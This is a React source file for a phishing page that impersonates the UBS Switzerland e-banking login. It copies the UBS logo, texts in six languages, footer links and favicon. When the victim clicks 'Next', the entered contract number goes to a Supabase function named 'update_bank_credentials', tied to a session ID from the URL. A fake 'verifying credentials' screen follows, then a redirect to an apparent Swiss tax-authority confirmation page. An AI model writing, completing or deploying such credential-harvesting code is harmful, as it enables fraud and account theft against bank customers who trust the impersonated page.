import { useEffect, useState } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Info, ChevronRight, ChevronDown, Globe, Check } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";

const UbsLogo = ({ className = "" }: { className?: string }) => (
  <svg viewBox="0 0 84 31" xmlns="http://www.w3.org/2000/svg" className={className} aria-label="UBS">
    <path d="M48.935 18.357c0 6.144-3.359 6.881-6.718 6.881-5.775 0-7.004-2.949-7.004-7.168V6.172h-2.13V5.025h8.07v1.147h-2.294v11.55c0 4.075 1.065 6.103 3.993 6.103 2.99 0 4.444-1.475 4.444-5.714V6.171h-2.15V5.026h5.734v1.147h-1.945v12.185zm5.488 5.509V6.172h-2.089V5.025h8.95c3.81 0 5.693 2.15 5.693 4.669 0 2.683-2.437 4.198-4.608 4.649 4.22.389 5.366 3.092 5.366 5.079 0 4.055-3.461 5.59-6.86 5.59H52.19v-1.146h2.232zm8.909-13.947c0-1.863-.963-3.747-3.072-3.747h-2.273v7.68h2.027c2.232 0 3.318-1.885 3.318-3.933zm.717 9.503c0-2.663-1.147-4.444-3.83-4.444h-2.232v8.888h1.802c2.847 0 4.26-1.68 4.26-4.444zM76.664 5.905c-2.11 0-3.46 1.25-3.46 3.42 0 1.966 2.129 2.908 4.197 3.605 1.23.43 2.786 1.003 3.85 2.027 1.168 1.106 1.803 2.58 1.762 4.444-.082 3.482-2.52 5.837-6.82 5.858-1.618 0-4.137-.37-5.652-1.25l-.164-5.243h1.27c.102 3.523 1.76 5.366 4.669 5.366 2.335 0 3.625-1.556 3.625-3.932 0-2.048-1.7-2.929-4.28-3.789-.84-.286-2.499-.9-3.666-2.048-1.045-1.044-1.536-2.355-1.536-3.747 0-4.076 2.908-5.837 6.512-5.837 1.434 0 3.584.512 4.834 1.229l.122 4.546h-1.27c-.266-3.236-1.679-4.649-3.993-4.649z" fill="#E60000" />
    <path d="M23.112 9.07l-.534.444.563 1.839-1.69-.92-.563.446 1.868 1.008-1.987 1.6-.534-.71.712-.564-.534-.623-.711.564-.534-.682.712-.564-.534-.682-3.647 3.025 3.469 2.787.623-.77c.444.029.77.355.948.77l-.622.771.385.296c.86-.77 1.987-1.274 3.143-1.274 2.432 0 4.33 1.986 4.33 4.418 0 .8-.208 1.66-.653 2.372l.653.504c-.03.475-.475.979-.92 1.097l-.622-.504a4.536 4.536 0 01-3.173 1.275c-2.432 0-4.33-1.927-4.33-4.388 0-.8.238-1.631.594-2.313l-.356-.326-.623.83a1.104 1.104 0 01-.949-.83l.623-.742-2.936-2.431v3.854l.979.03a.955.955 0 01.208.593c0 .208-.09.445-.179.623h-1.008v.474c2.135.356 3.915 2.165 3.915 4.36 0 2.283-1.75 4.091-3.915 4.447v.771a1.523 1.523 0 01-.711.208 1.89 1.89 0 01-.801-.208v-.77c-2.165-.357-3.855-2.165-3.855-4.449 0-2.194 1.69-4.003 3.855-4.33v-.503h-1.008a1.166 1.166 0 01-.178-.623c0-.237.06-.445.178-.623h1.008v-3.854l-2.965 2.431.652.742c-.148.474-.534.77-.978.83l-.623-.83-.386.326c.416.682.623 1.512.623 2.313 0 2.46-1.898 4.388-4.33 4.388-1.156 0-2.312-.444-3.142-1.275l-.653.504c-.415-.118-.86-.622-.919-1.097l.623-.504c-.386-.712-.623-1.572-.623-2.372 0-2.432 1.898-4.418 4.33-4.418 1.185 0 2.312.504 3.172 1.274l.356-.266-.623-.8c.149-.416.534-.713.979-.772l.623.771 3.469-2.787-3.647-3.025-.534.682.712.564-.534.682-.712-.564-.534.623.682.563-.533.712-1.957-1.601 1.838-1.008-.534-.445-1.69.919.563-1.839-.533-.444-.623 2.016-1.987-1.601.534-.653.682.564.563-.653-.711-.622.534-.623.711.534.504-.623-1.542-1.216c.149-.504.475-.919.95-1.215l8.213 6.701V7.201h-.83v.86h-.83v-.86h-.86v.86h-.86v-2.52l1.957.83V5.66l-1.81-.742 1.81-.711v-.682l-1.957.77v-2.55h.86v.92h.86v-.92h.83v.92h.83V.648c.237-.089.504-.148.771-.148.237 0 .504.06.741.148V11.68l8.214-6.701c.445.296.771.711.95 1.215L22.873 7.41l.534.623.712-.534.534.623-.712.622.534.653.711-.564.534.653-1.987 1.601-.622-2.016zM6.328 21.198c0 .711.534 1.156 1.157 1.216l-1.038.8c-.712-.267-1.364-1.127-1.364-1.868 0-.237.06-.385.118-.563-.089 0-.148.03-.207.03-.95 0-1.75-.89-1.928-1.81l1.068-.83c-.03.119-.03.208-.03.297 0 .593.564 1.126 1.157 1.126.622 0 1.215-.533 1.215-1.156 0-.771-.593-1.275-1.334-1.275-1.453 0-2.876 1.394-2.876 3.232 0 .534.118 1.038.356 1.483l.652-.504c.445.207.8.652.92 1.156l-.653.504c.623.534 1.394.771 2.194.771 1.66 0 2.995-1.334 2.995-2.52 0-.682-.474-1.275-1.186-1.275-.652 0-1.216.504-1.216 1.186zm8.807 2.55c0 .652.534 1.186 1.157 1.186.444 0 .622-.178.948-.445v1.335a2.05 2.05 0 01-1.008.266c-.711 0-1.304-.207-1.69-.83-.415.623-1.008.83-1.72.83-.326 0-.682-.088-1.008-.266v-1.335c.297.297.534.445.949.445.652 0 1.156-.534 1.156-1.186 0-.623-.415-1.186-1.097-1.186-1.216 0-1.72 1.156-1.72 2.224 0 1.571 1.157 2.906 2.669 3.173v-.801c.237-.119.504-.148.741-.148.267 0 .534.03.771.148v.8c1.394-.207 2.67-1.69 2.67-3.172 0-1.098-.446-2.224-1.72-2.224-.653 0-1.098.563-1.098 1.186zm7.384-5.308c0 .593.622 1.156 1.245 1.156.593 0 1.157-.533 1.157-1.126 0-.09-.03-.178-.03-.297l1.038.83c-.178 1.009-1.068 1.898-2.106 1.78.06.178.09.326.09.563 0 .741-.653 1.601-1.365 1.868l-1.038-.8c.653-.06 1.187-.505 1.187-1.216 0-.682-.594-1.186-1.246-1.186-.682 0-1.186.593-1.186 1.304 0 .86 1.038 2.491 3.025 2.491.8 0 1.571-.237 2.164-.77l-.652-.505c.148-.504.445-.949.92-1.156l.651.504a3.15 3.15 0 00.386-1.483c0-1.423-1.097-3.232-2.847-3.232-.741 0-1.393.504-1.393 1.275z" />
  </svg>
);

const LANGS = [
  { code: "de", label: "Deutsch" },
  { code: "fr", label: "Français" },
  { code: "it", label: "Italiano" },
  { code: "en", label: "English" },
  { code: "es", label: "Español" },
  { code: "pt", label: "Português" },
] as const;

type Lang = (typeof LANGS)[number]["code"];

const FOOTER_LINKS_HREFS = [
  "https://secure.ubs.com/__digitalbanking/ubs-information",
  "https://secure.ubs.com/__digitalbanking/terms-of-use",
  "https://secure.ubs.com/__digitalbanking/privacy-statement",
  "https://secure.ubs.com/__digitalbanking/report-fraudulent-mail",
];
const HOWTO_HREF = "https://secure.ubs.com/__digitalbanking-CH/login-problem";

const T: Record<Lang, {
  ebanking: string;
  country: string;
  greeting: string;
  subtitle: string;
  contract: string;
  remember: string;
  next: string;
  howto: string;
  tooltip: string;
  footerLinks: string[];
  disclaimer: string;
  copyright: string;
}> = {
  de: {
    ebanking: "E-Banking",
    country: "Schweiz",
    greeting: "Guten Morgen",
    subtitle: "Login UBS E-Banking",
    contract: "Vertragsnummer",
    remember: "Vertragsnummer speichern",
    next: "Weiter",
    howto: "So loggen Sie sich ein",
    tooltip:
      "Ihre Vertragsnummer finden Sie in Ihrer Access App, Ihrer Mobile Banking App oder im Brief mit der Aktivierungs-PIN. Für weitere Informationen klicken Sie auf „So loggen Sie sich ein\".",
    footerLinks: ["Information zu UBS", "Nutzungsbedingungen", "Datenschutzerklärung", "Betrügerische E-Mails melden"],
    disclaimer:
      "Die auf dieser Website angebotenen Produkte, Dienstleistungen, Informationen und/oder Unterlagen sind Personen mit Wohnsitz in bestimmten Ländern möglicherweise nicht zugänglich. Bitte beachten Sie die geltenden Verkaufsbeschränkungen für die entsprechenden Produkte oder Dienstleistungen.",
    copyright: "© UBS 1998 - 2026. Alle Rechte vorbehalten.",
  },
  fr: {
    ebanking: "E-Banking",
    country: "Suisse",
    greeting: "Bonjour",
    subtitle: "Login UBS E-Banking",
    contract: "Numéro de contrat",
    remember: "Enregistrer le numéro de contrat",
    next: "Suivant",
    howto: "Comment vous connecter",
    tooltip:
      "Vous trouverez votre numéro de contrat dans votre Access App, votre Mobile Banking App ou dans la lettre contenant le PIN d'activation.",
    footerLinks: ["Informations sur UBS", "Conditions d'utilisation", "Déclaration de confidentialité", "Signaler les e-mails frauduleux"],
    disclaimer:
      "Les produits, services, informations et/ou documents proposés sur ce site peuvent ne pas être accessibles aux personnes résidant dans certains pays.",
    copyright: "© UBS 1998 - 2026. Tous droits réservés.",
  },
  it: {
    ebanking: "E-Banking",
    country: "Svizzera",
    greeting: "Buongiorno",
    subtitle: "Login UBS E-Banking",
    contract: "Numero di contratto",
    remember: "Memorizzare il numero di contratto",
    next: "Avanti",
    howto: "Come effettuare il login",
    tooltip:
      "Il numero di contratto si trova nella Access App, nella Mobile Banking App o nella lettera con il PIN di attivazione.",
    footerLinks: ["Informazioni su UBS", "Condizioni d'uso", "Dichiarazione sulla protezione dei dati", "Segnalare e-mail fraudolente"],
    disclaimer:
      "I prodotti, i servizi, le informazioni e/o i documenti offerti su questo sito potrebbero non essere accessibili alle persone residenti in determinati paesi.",
    copyright: "© UBS 1998 - 2026. Tutti i diritti riservati.",
  },
  en: {
    ebanking: "E-Banking",
    country: "Switzerland",
    greeting: "Good morning",
    subtitle: "Login UBS E-Banking",
    contract: "Contract number",
    remember: "Remember contract number",
    next: "Next",
    howto: "How to log in",
    tooltip:
      "You will find your contract number in your Access App, your Mobile Banking App or in the letter with the activation PIN.",
    footerLinks: ["Information about UBS", "Terms of use", "Privacy statement", "Report fraudulent e-mails"],
    disclaimer:
      "The products, services, information and/or materials offered on this website may not be available for residents of certain jurisdictions.",
    copyright: "© UBS 1998 - 2026. All rights reserved.",
  },
  es: {
    ebanking: "E-Banking",
    country: "Suiza",
    greeting: "Buenos días",
    subtitle: "Login UBS E-Banking",
    contract: "Número de contrato",
    remember: "Guardar el número de contrato",
    next: "Continuar",
    howto: "Cómo iniciar sesión",
    tooltip:
      "Encontrará su número de contrato en su Access App, su Mobile Banking App o en la carta con el PIN de activación.",
    footerLinks: ["Información sobre UBS", "Condiciones de uso", "Declaración de privacidad", "Notificar correos fraudulentos"],
    disclaimer:
      "Los productos, servicios, información y/o materiales ofrecidos en este sitio web pueden no estar disponibles para residentes de determinadas jurisdicciones.",
    copyright: "© UBS 1998 - 2026. Todos los derechos reservados.",
  },
  pt: {
    ebanking: "E-Banking",
    country: "Suíça",
    greeting: "Bom dia",
    subtitle: "Login UBS E-Banking",
    contract: "Número de contrato",
    remember: "Guardar o número de contrato",
    next: "Continuar",
    howto: "Como iniciar sessão",
    tooltip:
      "O seu número de contrato encontra-se na Access App, na Mobile Banking App ou na carta com o PIN de ativação.",
    footerLinks: ["Informações sobre o UBS", "Condições de utilização", "Declaração de privacidade", "Comunicar e-mails fraudulentos"],
    disclaimer:
      "Os produtos, serviços, informações e/ou materiais oferecidos neste site podem não estar disponíveis para residentes em determinadas jurisdições.",
    copyright: "© UBS 1998 - 2026. Todos os direitos reservados.",
  },
};

const ChUbs = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [focused, setFocused] = useState(false);
  const [remember, setRemember] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [lang, setLang] = useState<Lang>("de");
  const [langOpen, setLangOpen] = useState(false);
  const t = T[lang];

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);
  usePageMeta("UBS E-Banking Login", "https://www.ubs.com/favicon.ico");

  const handleNext = async () => {
    if (!vertragsnummer) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: "",
        p_username_label: "Vertragsnummer",
        p_password_label: "",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const labelFloating = focused || vertragsnummer.length > 0;

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col font-sans text-[#1a1a1a] overflow-x-hidden">
        {/* Header */}
        <header className="h-[72px] flex items-center justify-between px-4 md:px-10 border-b border-[#eee] bg-white relative z-20">
          <div className="flex items-center gap-3 md:gap-5">
            <UbsLogo className="h-6 md:h-7" />
            <span className="text-base md:text-lg font-normal text-[#1a1a1a]">{t.ebanking}</span>
          </div>
          <div className="flex items-center gap-4 md:gap-8 text-sm">
            <span className="text-[#666]">{t.country}</span>
            <div className="relative">
              <button
                onClick={() => setLangOpen((o) => !o)}
                className={`flex items-center gap-2 px-3 py-2 transition-colors ${
                  langOpen ? "bg-black text-white" : "text-[#1a1a1a] hover:text-black"
                }`}
              >
                <Globe className="w-4 h-4" />
                <span className="hidden md:inline">{LANGS.find((l) => l.code === lang)?.label}</span>
                <ChevronDown className="w-3 h-3" />
              </button>

              {langOpen && (
                <div className="absolute right-0 top-full mt-1 bg-white border border-[#e5e5e5] shadow-md min-w-[240px] z-30 py-1">
                  {LANGS.map((l) => (
                    <button
                      key={l.code}
                      onClick={() => {
                        setLang(l.code);
                        setLangOpen(false);
                      }}
                      className={`block w-full text-left px-5 py-3 text-sm hover:bg-[#f5f5f5] ${
                        lang === l.code ? "bg-[#ececec]" : ""
                      }`}
                    >
                      {l.label}
                    </button>
                  ))}
                </div>
              )}
            </div>
          </div>
        </header>

        {/* Shared gradient wrapper for body + footer */}
        <div
          className="flex-1 flex flex-col"
          style={{
            background: "linear-gradient(180deg, #fef0e9 0%, #f0cdd1 100%)",
          }}
        >
          <main className="flex-1 flex items-start justify-center px-4 py-12 md:py-20">
            <div className="w-full max-w-[380px] bg-white shadow-[0_1px_3px_rgba(0,0,0,0.08)] rounded-sm px-6 py-8 md:px-8 md:py-10">
              <h1 className="text-[32px] md:text-[36px] font-normal text-center text-[#1a1a1a] leading-tight">
                {t.greeting}
              </h1>
              <p className="text-center text-[15px] text-[#5a5d5c] mt-2 mb-8">{t.subtitle}</p>

              {/* Outlined input with floating label */}
              <div className="mb-5">
                <div
                  className={`relative border border-[#1a1a1a] transition-[box-shadow] duration-150 ${
                    focused ? "shadow-[inset_0_0_0_1px_#1a1a1a]" : ""
                  }`}
                >
                  <label
                    className={`absolute left-3 pointer-events-none transition-all duration-200 ease-out text-[#5a5d5c] ${
                      labelFloating
                        ? "top-1 text-[11px]"
                        : "top-1/2 -translate-y-1/2 text-[15px]"
                    }`}
                  >
                    {t.contract}
                  </label>
                  <input
                    type="text"
                    value={vertragsnummer}
                    onChange={(e) => setVertragsnummer(e.target.value)}
                    onFocus={() => setFocused(true)}
                    onBlur={() => setFocused(false)}
                    onKeyDown={(e) => e.key === "Enter" && handleNext()}
                    autoFocus
                    autoComplete="off"
                    className="w-full bg-transparent px-3 pt-5 pb-2 pr-10 text-[15px] text-black focus:outline-none"
                  />
                  {/* Info icon with hover tooltip */}
                  <div className="absolute right-2 top-1/2 -translate-y-1/2 group">
                    <Info strokeWidth={1.25} className="w-5 h-5 text-[#1a1a1a] cursor-help" />
                    <div className="invisible opacity-0 group-hover:visible group-hover:opacity-100 transition-opacity duration-150 absolute left-full top-1/2 -translate-y-1/2 ml-3 w-[280px] bg-white border border-[#e5e5e5] shadow-lg p-3 text-[12px] text-[#1a1a1a] leading-snug z-30">
                      <div className="absolute -left-[6px] top-1/2 -translate-y-1/2 w-3 h-3 bg-white border-l border-b border-[#e5e5e5] rotate-45" />
                      <span className="relative">{t.tooltip}</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Remember checkbox */}
              <label className="flex items-center gap-3 mb-8 cursor-pointer text-[14px] text-[#1a1a1a] select-none">
                <span className="relative inline-flex">
                  <input
                    type="checkbox"
                    checked={remember}
                    onChange={(e) => setRemember(e.target.checked)}
                    className="peer appearance-none w-4 h-4 border border-[#bdbdbd] bg-white checked:bg-[#1a1a1a] checked:border-[#1a1a1a] focus:outline focus:outline-1 focus:outline-offset-2 focus:outline-[#1a1a1a] transition-colors"
                  />
                  <Check className="pointer-events-none absolute inset-0 m-auto w-3 h-3 text-white opacity-0 peer-checked:opacity-100" />
                </span>
                {t.remember}
              </label>

              <button
                onClick={handleNext}
                className="w-full bg-[#444] hover:bg-[#1a1a1a] text-white py-3 text-[15px] font-bold transition-colors"
              >
                {t.next}
              </button>

              <a
                href={HOWTO_HREF}
                className="flex items-center justify-center gap-1 w-full mt-6 text-[14px] font-bold text-[#1c1c1c] hover:underline"
              >
                <ChevronRight className="w-4 h-4 text-[#da0000]" />
                {t.howto}
              </a>
            </div>
          </main>

          {/* Divider between body and footer */}
          <div className="border-t border-[#d8b4b4] mx-[10px]" />

          {/* Footer */}
          <footer className="px-4 md:px-10 py-6 md:py-8">
            <div className="flex flex-wrap items-center gap-x-2 gap-y-2 text-[14px] text-black">
              {t.footerLinks.map((l, i) => (
                <span key={l} className="flex items-center gap-2">
                  <a
                    href={FOOTER_LINKS_HREFS[i]}
                    className="underline hover:no-underline text-black"
                  >
                    {l}
                  </a>
                  {i < t.footerLinks.length - 1 && <span className="text-black">|</span>}
                </span>
              ))}
            </div>
            <p className="text-[13px] text-black mt-4 leading-relaxed max-w-5xl">{t.disclaimer}</p>
            <p className="text-[13px] text-black mt-3">{t.copyright}</p>
          </footer>
        </div>
      </div>
    </>
  );
};

export default ChUbs;
